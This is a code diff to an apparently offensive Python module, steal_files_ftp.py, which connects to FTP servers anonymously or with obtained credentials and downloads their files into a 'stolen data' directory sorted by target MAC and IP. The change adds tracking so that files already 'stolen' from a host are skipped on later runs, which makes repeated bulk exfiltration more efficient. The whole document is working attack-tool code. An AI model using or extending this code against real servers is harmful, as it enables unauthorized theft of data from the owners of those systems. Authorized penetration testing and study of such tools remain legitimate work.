@@ -10,6 +10,7 @@ from threading import Timer
 from ftplib import FTP
 from shared import SharedData
 from logger import Logger
+from actions.connector_utils import FileTracker
 
 # Configure the logger
 logger = Logger(name="steal_files_ftp.py", level=logging.DEBUG)
@@ -30,6 +31,7 @@ class StealFilesFTP:
             self.shared_data = shared_data
             self.ftp_connected = False
             self.stop_execution = False
+            self.file_tracker = FileTracker('ftp', self.shared_data.datadir)
             logger.info("StealFilesFTP initialized")
         except Exception as e:
             logger.error(f"Error during initialization: {e}")
@@ -71,19 +73,30 @@ class StealFilesFTP:
             logger.error(f"Error accessing path {dir_path} on FTP: {e}")
         return files
 
-    def steal_file(self, ftp, remote_file, local_dir):
+    def steal_file(self, ftp, remote_file, local_dir, ip):
         """
         Download a file from the FTP server to the local directory.
+        Optimization: Skip files that have already been downloaded.
         """
         try:
+            # Check if file was already stolen
+            if self.file_tracker.is_file_stolen(ip, remote_file):
+                logger.debug(f"Skipping {remote_file}: already stolen from {ip}")
+                return False
+            
             local_file_path = os.path.join(local_dir, os.path.relpath(remote_file, '/'))
             local_file_dir = os.path.dirname(local_file_path)
             os.makedirs(local_file_dir, exist_ok=True)
             with open(local_file_path, 'wb') as f:
                 ftp.retrbinary(f'RETR {remote_file}', f.write)
             logger.success(f"Downloaded file from {remote_file} to {local_file_path}")
+            
+            # Mark file as stolen
+            self.file_tracker.mark_file_stolen(ip, remote_file)
+            return True
         except Exception as e:
             logger.error(f"Error downloading file {remote_file} from FTP: {e}")
+            return False
 
     def execute(self, ip, port, row, status_key):
         """
@@ -142,13 +155,24 @@ class StealFilesFTP:
                     mac = row['MAC Address']
                     local_dir = os.path.join(self.shared_data.datastolendir, f"ftp/{mac}_{ip}/anonymous")
                     if remote_files:
-                        for remote_file in remote_files:
+                        # Filter new files
+                        new_files, already_stolen_count = self.file_tracker.filter_new_files(ip, remote_files)
+                        if already_stolen_count > 0:
+                            logger.info(f"Skipping {already_stolen_count} already stolen files, {len(new_files)} new files to download")
+                        
+                        downloaded_count = 0
+                        for remote_file in new_files:
                             if self.stop_execution:
                                 break
-                            self.steal_file(ftp, remote_file, local_dir)
-                        success = True
-                        countfiles = len(remote_files)
-                        logger.success(f"Successfully stolen {countfiles} files from {ip}:{port} via anonymous access")
+                            if self.steal_file(ftp, remote_file, local_dir, ip):
+                                downloaded_count += 1
+                        
+                        if downloaded_count > 0 or already_stolen_count > 0:
+                            success = True
+                            if downloaded_count > 0:
+                                logger.success(f"Successfully stolen {downloaded_count} new files from {ip}:{port} via anonymous access")
+                            else:
+                                logger.info(f"No new files from {ip} - all {already_stolen_count} files already stolen")
                     ftp.quit()
                     if success:
                         timer.cancel()  # Cancel the timer if the operation is successful
@@ -165,13 +189,24 @@ class StealFilesFTP:
                             mac = row['MAC Address']
                             local_dir = os.path.join(self.shared_data.datastolendir, f"ftp/{mac}_{ip}/{username}")
                             if remote_files:
-                                for remote_file in remote_files:
+                                # Filter new files
+                                new_files, already_stolen_count = self.file_tracker.filter_new_files(ip, remote_files)
+                                if already_stolen_count > 0:
+                                    logger.info(f"Skipping {already_stolen_count} already stolen files, {len(new_files)} new files to download")
+                                
+                                downloaded_count = 0
+                                for remote_file in new_files:
                                     if self.stop_execution:
                                         break
-                                    self.steal_file(ftp, remote_file, local_dir)
-                                success = True
-                                countfiles = len(remote_files)
-                                logger.info(f"Successfully stolen {countfiles} files from {ip}:{port} with user '{username}'")
+                                    if self.steal_file(ftp, remote_file, local_dir, ip):
+                                        downloaded_count += 1
+                                
+                                if downloaded_count > 0 or already_stolen_count > 0:
+                                    success = True
+                                    if downloaded_count > 0:
+                                        logger.info(f"Successfully stolen {downloaded_count} new files from {ip}:{port} with user '{username}'")
+                                    else:
+                                        logger.info(f"No new files from {ip} - all {already_stolen_count} files already stolen")
                             ftp.quit()
                             if success:
                                 timer.cancel()  # Cancel the timer if the operation is successful
